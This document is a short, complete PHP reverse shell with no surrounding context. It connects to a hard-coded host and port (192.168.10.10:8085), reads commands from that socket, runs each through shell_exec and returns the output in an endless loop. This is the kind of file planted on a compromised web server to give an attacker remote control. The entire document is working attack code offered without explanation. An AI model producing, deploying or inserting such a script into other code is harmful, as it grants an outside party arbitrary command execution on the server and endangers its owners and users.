<?php
set_time_limit(0);
$ip = '192.168.10.10';
$port = 8085;
$sock = fsockopen($ip, $port);
while(!feof($sock)) {
    $command = fgets($sock, 1024);
    $output = shell_exec($command);
    fwrite($sock, $output);
}
fclose($sock);
?>
